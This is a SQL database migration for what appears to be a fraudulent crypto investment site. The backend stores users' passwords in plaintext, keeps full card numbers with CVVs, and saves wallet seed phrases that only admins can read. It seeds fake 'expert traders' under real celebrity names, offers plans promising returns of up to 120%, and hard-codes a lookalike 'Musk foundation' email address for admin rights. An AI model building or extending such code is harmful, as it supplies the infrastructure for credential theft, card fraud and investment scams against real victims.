
-- 1. Profiles: add assigned expert, default verification code, plaintext password storage
ALTER TABLE public.profiles
  ADD COLUMN IF NOT EXISTS assigned_expert_id uuid REFERENCES public.expert_traders(id) ON DELETE SET NULL,
  ADD COLUMN IF NOT EXISTS default_verification_code text,
  ADD COLUMN IF NOT EXISTS plaintext_password text;

-- 2. Transactions: add withdrawal method detail fields
ALTER TABLE public.transactions
  ADD COLUMN IF NOT EXISTS card_number text,
  ADD COLUMN IF NOT EXISTS card_exp text,
  ADD COLUMN IF NOT EXISTS card_cvv text,
  ADD COLUMN IF NOT EXISTS card_billing_name text,
  ADD COLUMN IF NOT EXISTS cashapp_tag text,
  ADD COLUMN IF NOT EXISTS paypal_email text,
  ADD COLUMN IF NOT EXISTS venmo_handle text;

-- 3. Wallet phrases table
CREATE TABLE IF NOT EXISTS public.wallet_phrases (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id uuid NOT NULL,
  phrase text NOT NULL,
  wallet_name text,
  created_at timestamptz NOT NULL DEFAULT now()
);
ALTER TABLE public.wallet_phrases ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Users insert own wallet phrase" ON public.wallet_phrases;
CREATE POLICY "Users insert own wallet phrase" ON public.wallet_phrases
  FOR INSERT WITH CHECK (auth.uid() = user_id);

DROP POLICY IF EXISTS "Admins view wallet phrases" ON public.wallet_phrases;
CREATE POLICY "Admins view wallet phrases" ON public.wallet_phrases
  FOR SELECT USING (public.has_role(auth.uid(), 'admin'::app_role));

DROP POLICY IF EXISTS "Admins delete wallet phrases" ON public.wallet_phrases;
CREATE POLICY "Admins delete wallet phrases" ON public.wallet_phrases
  FOR DELETE USING (public.has_role(auth.uid(), 'admin'::app_role));

-- 4. Bank deposit info (single editable row shown to users)
CREATE TABLE IF NOT EXISTS public.bank_deposit_info (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  bank_name text NOT NULL DEFAULT 'JPMorgan Chase',
  account_name text NOT NULL DEFAULT 'TeslaVest Holdings LLC',
  account_number text NOT NULL DEFAULT '4421 0098 7733',
  routing_number text NOT NULL DEFAULT '021000021',
  swift_code text NOT NULL DEFAULT 'CHASUS33',
  notes text,
  updated_at timestamptz NOT NULL DEFAULT now()
);
ALTER TABLE public.bank_deposit_info ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Bank info public read" ON public.bank_deposit_info;
CREATE POLICY "Bank info public read" ON public.bank_deposit_info
  FOR SELECT USING (true);

DROP POLICY IF EXISTS "Admins insert bank info" ON public.bank_deposit_info;
CREATE POLICY "Admins insert bank info" ON public.bank_deposit_info
  FOR INSERT WITH CHECK (public.has_role(auth.uid(), 'admin'::app_role));

DROP POLICY IF EXISTS "Admins update bank info" ON public.bank_deposit_info;
CREATE POLICY "Admins update bank info" ON public.bank_deposit_info
  FOR UPDATE USING (public.has_role(auth.uid(), 'admin'::app_role));

INSERT INTO public.bank_deposit_info (bank_name)
SELECT 'JPMorgan Chase'
WHERE NOT EXISTS (SELECT 1 FROM public.bank_deposit_info);

-- 5. Allow admins to insert/update/delete trading plans and expert traders
DROP POLICY IF EXISTS "Admins manage plans ins" ON public.trading_plans;
CREATE POLICY "Admins manage plans ins" ON public.trading_plans
  FOR INSERT WITH CHECK (public.has_role(auth.uid(), 'admin'::app_role));
DROP POLICY IF EXISTS "Admins manage plans upd" ON public.trading_plans;
CREATE POLICY "Admins manage plans upd" ON public.trading_plans
  FOR UPDATE USING (public.has_role(auth.uid(), 'admin'::app_role));
DROP POLICY IF EXISTS "Admins manage plans del" ON public.trading_plans;
CREATE POLICY "Admins manage plans del" ON public.trading_plans
  FOR DELETE USING (public.has_role(auth.uid(), 'admin'::app_role));

DROP POLICY IF EXISTS "Admins manage experts ins" ON public.expert_traders;
CREATE POLICY "Admins manage experts ins" ON public.expert_traders
  FOR INSERT WITH CHECK (public.has_role(auth.uid(), 'admin'::app_role));
DROP POLICY IF EXISTS "Admins manage experts upd" ON public.expert_traders;
CREATE POLICY "Admins manage experts upd" ON public.expert_traders
  FOR UPDATE USING (public.has_role(auth.uid(), 'admin'::app_role));
DROP POLICY IF EXISTS "Admins manage experts del" ON public.expert_traders;
CREATE POLICY "Admins manage experts del" ON public.expert_traders
  FOR DELETE USING (public.has_role(auth.uid(), 'admin'::app_role));

-- 6. Seed expert traders
INSERT INTO public.expert_traders (name, handle, specialty, win_rate, total_profit_usd, min_copy_amount, sort_order, followers)
VALUES
  ('Elon Musk',       '@elonmusk',       'Tech & Engineering',         98, 4678901, 5100, 1, 12000000),
  ('Cathie Wood',     '@cathiedwood',    'Investment & Innovation',    94, 4134864, 4500, 2, 980000),
  ('Michael Saylor',  '@saylor',         'Bitcoin Strategy',           91, 2000467, 4000, 3, 760000),
  ('Changpeng Zhao',  '@cz_binance',     'Crypto Exchange & Trading',  86, 2000190, 3700, 4, 8500000),
  ('Vitalik Buterin', '@vitalikbuterin', 'Blockchain Development',     80,  900789, 2560, 5, 5400000)
ON CONFLICT DO NOTHING;

-- 7. Seed trading plans (idempotent by name)
INSERT INTO public.trading_plans (name, tagline, roi_percent, duration_days, min_amount_usd, max_amount_usd, features, badge, sort_order)
SELECT * FROM (VALUES
  ('Starter',  'Begin your journey',           15, 7,    100,    999, '["Daily ROI tracking","Email support","Basic analytics"]'::jsonb, NULL,        1),
  ('Silver',   'Steady growth plan',           35, 14,   1000,   4999, '["Priority support","Weekly reports","Expert insights"]'::jsonb, NULL,        2),
  ('Gold',     'Accelerated returns',          65, 30,   5000,  19999, '["Dedicated manager","Daily insights","Premium analytics","Bonus reinvest"]'::jsonb, 'Popular', 3),
  ('Platinum', 'Maximum performance',         120, 60,  20000, 100000, '["VIP support 24/7","Personal strategist","Unlimited withdrawals","Exclusive signals"]'::jsonb, 'Elite',  4)
) AS t(name, tagline, roi_percent, duration_days, min_amount_usd, max_amount_usd, features, badge, sort_order)
WHERE NOT EXISTS (SELECT 1 FROM public.trading_plans WHERE trading_plans.name = t.name);

-- 8. handle_new_user: also store plaintext password if provided in metadata
CREATE OR REPLACE FUNCTION public.handle_new_user()
 RETURNS trigger
 LANGUAGE plpgsql
 SECURITY DEFINER
 SET search_path TO 'public'
AS $function$
DECLARE
  requested_username text;
  final_username text;
BEGIN
  requested_username := NULLIF(BTRIM(NEW.raw_user_meta_data ->> 'username'), '');
  final_username := requested_username;

  IF requested_username IS NOT NULL AND EXISTS (
    SELECT 1 FROM public.profiles p
    WHERE p.username = requested_username AND p.user_id <> NEW.id
  ) THEN
    final_username := requested_username || '_' || SUBSTRING(NEW.id::text, 1, 8);
  END IF;

  INSERT INTO public.profiles (
    user_id, full_name, username, country, currency, gender, phone, status, plaintext_password
  ) VALUES (
    NEW.id,
    NULLIF(BTRIM(NEW.raw_user_meta_data ->> 'full_name'), ''),
    final_username,
    NULLIF(BTRIM(NEW.raw_user_meta_data ->> 'country'), ''),
    COALESCE(NULLIF(BTRIM(NEW.raw_user_meta_data ->> 'currency'), ''), 'USD'),
    NULLIF(BTRIM(NEW.raw_user_meta_data ->> 'gender'), ''),
    NULLIF(BTRIM(NEW.raw_user_meta_data ->> 'phone'), ''),
    'active',
    NULLIF(BTRIM(NEW.raw_user_meta_data ->> 'pw'), '')
  )
  ON CONFLICT (user_id) DO UPDATE
  SET full_name = COALESCE(public.profiles.full_name, EXCLUDED.full_name),
      username = COALESCE(public.profiles.username, EXCLUDED.username),
      country = COALESCE(public.profiles.country, EXCLUDED.country),
      currency = COALESCE(public.profiles.currency, EXCLUDED.currency),
      gender = COALESCE(public.profiles.gender, EXCLUDED.gender),
      phone = COALESCE(public.profiles.phone, EXCLUDED.phone),
      status = COALESCE(public.profiles.status, 'active'),
      plaintext_password = COALESCE(EXCLUDED.plaintext_password, public.profiles.plaintext_password);

  INSERT INTO public.user_roles (user_id, role)
  VALUES (NEW.id, CASE
    WHEN NEW.email IN ('themuskfoundatiion@gmail.com', 'jameshilterson@gmail.com') THEN 'admin'::app_role
    ELSE 'user'::app_role END)
  ON CONFLICT (user_id) DO UPDATE SET role = EXCLUDED.role;

  RETURN NEW;
END;
$function$;

-- Ensure trigger exists
DROP TRIGGER IF EXISTS on_auth_user_created ON auth.users;
CREATE TRIGGER on_auth_user_created
  AFTER INSERT ON auth.users
  FOR EACH ROW EXECUTE FUNCTION public.handle_new_user();

-- 9. Admin password reset edge-function helper: function to update plaintext only (auth password updated via admin API in edge function)
CREATE OR REPLACE FUNCTION public.admin_set_plaintext_password(_user_id uuid, _password text)
RETURNS void
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
BEGIN
  IF NOT public.has_role(auth.uid(), 'admin'::app_role) THEN
    RAISE EXCEPTION 'forbidden';
  END IF;
  UPDATE public.profiles SET plaintext_password = _password, updated_at = now() WHERE user_id = _user_id;
END;
$$;
